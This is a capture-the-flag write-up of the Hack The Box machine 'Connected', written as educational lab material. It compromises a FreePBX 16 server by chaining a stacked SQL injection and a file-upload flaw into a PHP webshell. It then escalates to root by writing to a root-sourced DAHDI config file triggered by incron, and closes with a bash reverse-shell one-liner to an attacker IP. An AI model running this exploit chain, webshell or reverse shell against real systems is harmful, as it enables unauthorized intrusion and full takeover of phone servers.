# Connected HTB

Started off with a full port scan to see what we're dealing with. Three ports open: 22 (SSH), 80 (HTTP), and 443 (HTTPS). The HTTP server redirects to `http://connected.htb/`, so there's some virtual host routing going on. The SSL cert has `pbxconnect` as the common name — that's a hint we're looking at some kind of PBX (phone system) software. Apache 2.4.6 on CentOS with PHP 7.4.16.

```bash
┌──(kurt㉿DESKTOP-K4AKPUI)-[~/Desktop/ctf/htb/connected]
└─$ nmap -sCV -p- -o nmap.txt 10.129.24.242
Nmap scan report for 10.129.24.242
Host is up (0.37s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http       Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-title: 400 Bad Request

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 12 01:35:59 2026 -- 1 IP address (1 host up) scanned in 1106.50 seconds
                                                                                                   
```

Popped the IP into a browser to poke around the web service. Turns out it's a **FreePBX 16** admin panel — pretty common open-source PBX management platform. Googled around for known FreePBX 16 vulnerabilities and found a public PoC for CVE-2025-57819, a stacked SQL injection in the login flow.

<img width="719" height="159" alt="image" src="https://github.com/user-attachments/assets/f77c94ec-2d20-4d82-80ca-611f419d2b8b" />


<img width="719" height="159" alt="image" src="https://github.com/user-attachments/assets/d6547331-de59-47fd-b5c9-56ba64a80a65" />


Found a GitHub repo that chains CVE-2025-57819 with CVE-2025-61678 (authenticated file upload) into one exploit. Cloned it and ran it with a basic `id` command to test.

https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE

<img width="719" height="159" alt="image" src="https://github.com/user-attachments/assets/9736667f-a79e-4907-9993-be9e44dfc0b1" />


Exploit worked first try. Here's what it does under the hood: first it uses the stacked SQLi to inject a new admin user straight into the `ampusers` table, then logs into the FreePBX admin panel with those fresh credentials, and finally uploads a PHP webshell through the authenticated file upload feature. End result — remote command execution as the `asterisk` user (UID 999).

```bash
┌──(kurt㉿DESKTOP-K4AKPUI)-[~/…/ctf/htb/connected/FreePBX-CVE-2025-57819-RCE]
└─$ python3 exploit.py --rhost connected.htb --command "id"

 ██████████ █████                  █████
░░███░░░░░█░░███                  ░░███
 ░███  █ ░  ░███████   █████ █████ ░███████
 ░██████    ░███░░███ ░░███ ░░███  ░███░░███
 ░███░░█    ░███ ░███  ░░░█████░   ░███ ░███
 ░███ ░   █ ░███ ░███   ███░░░███  ░███ ░███
 ██████████ ████ █████ █████ █████ ████████
░░░░░░░░░░ ░░░░ ░░░░░ ░░░░░ ░░░░░ ░░░░░░░░

    FreePBX 16 SQLi -> Admin -> RCE  (CVE-2025-57819 + CVE-2025-61678)
    linkedin: ehxb /// medium.com/@Ehxb /// github 0xEHxb

[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_ynsbr:btxxzd91tqs8
[+] admin row inserted into ampusers
[*] logging into FreePBX admin panel
[+] authenticated as svc_ynsbr
[*] [CVE-2025-61678] uploading webshell -> /t8tmpvkhv1/x8hnqzx4.php
[+] webshell live: https://connected.htb/t8tmpvkhv1/x8hnqzx4.php
[*] executing: id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```
<img width="719" height="159" alt="image" src="https://github.com/user-attachments/assets/80bfe7d3-fe8f-4623-9e83-90b55d393277" />
<img width="719" height="159" alt="image" src="https://github.com/user-attachments/assets/a76bc4da-d7b1-43e4-9dca-2d204cf4d7af" />


---

## User Flag

Webshell's alive, so let's grab the user flag straight away:

```bash
┌──(kurt㉿DESKTOP-K4AKPUI)-[~/…/ctf/htb/connected]
└─$ curl -sk 'https://connected.htb/t8tmpvkhv1/x8hnqzx4.php?cmd=cat%20/home/asterisk/user.txt'
<REDACTED>
```

---

## Privilege Escalation

### Poking Around

We're running as `asterisk` — not root. Time to look for misconfigurations.

```bash
$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)

$ cat /etc/passwd | grep -v nologin
root:x:0:0:root:/root:/bin/bash
asterisk:x:999:1000::/home/asterisk:/bin/bash
```

Checked writable files and scheduled tasks. Two things immediately stood out:

1. **`/etc/dahdi/init.conf`** — owned by `asterisk`. That's the config file for the DAHDI telephony driver, and it shouldn't be writable by an unprivileged user.
2. **incron** — there are two incron watches set up, both running scripts as root when files change.

```bash
$ ls -la /etc/dahdi/init.conf
-rw-r--r--. 1 asterisk asterisk 771 Jun  5  2023 /etc/dahdi/init.conf

$ cat /etc/incron.d/*
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

Looked at what `/etc/init.d/dahdi` does with that config file:

```bash
$ grep -n 'init.conf' /etc/init.d/dahdi
9:# config: /etc/dahdi/init.conf
25:# Don't edit the following values. Edit /etc/dahdi/init.conf instead.
69:[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
```

Line 69 sources `init.conf` with the `.` (source) command — meaning whatever we put in there gets executed in the shell context of whoever runs the script.

### Putting It Together

The attack chain is pretty clean:

```
touch /var/spool/asterisk/sysadmin/dahdi_restart
     → incrond (as root) fires /usr/sbin/sysadmin_dahdi_restart
         → that calls /etc/init.d/dahdi restart
             → which sources our writable /etc/dahdi/init.conf
                 → our payload runs as root
```

### Root Flag

Wrote a simple payload to copy the root flag to the webroot, then triggered the chain:

```bash
cat > /etc/dahdi/init.conf << 'EOF'
cp /root/root.txt /var/www/html/flag.txt
chmod 644 /var/www/html/flag.txt
EOF

touch /var/spool/asterisk/sysadmin/dahdi_restart

$ curl -sk 'https://connected.htb/flag.txt'
<REDACTED>
```

If you want a reverse shell instead, this works too:

```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.17.95/4445 0>&1' &
```

---
